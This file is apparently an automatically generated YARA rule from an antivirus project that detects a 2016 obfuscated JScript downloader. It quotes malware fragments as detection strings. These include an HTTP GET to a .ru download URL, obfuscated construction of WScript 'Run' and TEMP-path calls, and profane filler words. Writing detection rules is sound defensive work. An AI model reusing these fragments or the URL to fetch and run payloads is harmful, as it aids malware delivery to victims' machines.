rule sig_20160428_165ec03ab48b1adbb69b9904d67e8aad {
  meta:
    description = "datamaliciousorder - file 20160428_165ec03ab48b1adbb69b9904d67e8aad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9901f56ad0852cfc2449602d19d4676b244e7d8a6ef3f1afb198484941cdde51"

  strings:
    $s1  = "function CxtOanDpaOadLawUydKys(WwqSsiZntUbnDirCtuToq, XgrTfgHtsSfjFnsSveMje){TqlKtbGhiRzpKktSarFia = TqlKtbGhiRzpKktSarFia * 1; " ascii
    $s2  = "return WwqSsiZntUbnDirCtuToq - XgrTfgHtsSfjFnsSveMje;};" fullword ascii
    $s3  = "function CxtOanDpaOadLawUydKys(WwqSsiZntUbnDirCtuToq, XgrTfgHtsSfjFnsSveMje){TqlKtbGhiRzpKktSarFia = TqlKtbGhiRzpKktSarFia * 1; " ascii
    $s4  = "function EhiLtnMizAdeFdhJjpBfw(UrpDxyMlxAbkGzcMfxNxd){LrwVioUtcZejXyaWnsKvx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function HodWvnKuyZzxFqoLfzSwk() {return LrwVioUtcZejXyaWnsKvx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function EhiLtnMizAdeFdhJjpBfw(UrpDxyMlxAbkGzcMfxNxd){LrwVioUtcZejXyaWnsKvx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s7  = "var LrwVioUtcZejXyaWnsKvx = function KctAwyGwsQedRyiZkzPfa() {return QazNasTgsSomHabJwpCls[JeeGrbVenQmjPpdKgmYxi](\"WScript\"+\"" ascii
    $s8  = "NvzNolGcrEkmSthIssTao[TadDmqVnoUarFkaNaiGaj](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s9  = "var QazNasTgsSomHabJwpCls = this[\"WScript\"];" fullword ascii
    $s10 = "var LrwVioUtcZejXyaWnsKvx = function KctAwyGwsQedRyiZkzPfa() {return QazNasTgsSomHabJwpCls[JeeGrbVenQmjPpdKgmYxi](\"WScript\"+\"" ascii
    $s11 = "function HodWvnKuyZzxFqoLfzSwk() {return LrwVioUtcZejXyaWnsKvx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (NvzNolGcrEkmSthIssTao[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function GdcCjdYviExxYmeIndXrn(){return BjuZehQpaZngUmmDniHxs + \"\";};" fullword ascii
    $s14 = "function BojPpcLaeQnsHllOcfDie() {return ((XjmPppUmgDtjIkvPcuGzu == true) && (XjmPppUmgDtjIkvPcuGzu == MpxLjtOkjPwoRhwXadCsd)) ?" ascii
    $s15 = "function BojPpcLaeQnsHllOcfDie() {return ((XjmPppUmgDtjIkvPcuGzu == true) && (XjmPppUmgDtjIkvPcuGzu == MpxLjtOkjPwoRhwXadCsd)) ?" ascii
    $s16 = "}while (NhhTioCdlIdfIwhGlwTnj);" fullword ascii
    $s17 = "function YlhZgtQvrEunZvcWpmFjo(){return 23;};" fullword ascii
    $s18 = "MpxLjtOkjPwoRhwXadCsd = true; " fullword ascii
    $s19 = "XjmPppUmgDtjIkvPcuGzu = true; " fullword ascii
    $s20 = "function KawQkcTsrBshWpcKhiEed(LoiQgxSwjZkgGsdMtjNfy) {var NzyEqwOxoYzjJmaAyzWxw = (1, 2, 3, 4, 5, LoiQgxSwjZkgGsdMtjNfy); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}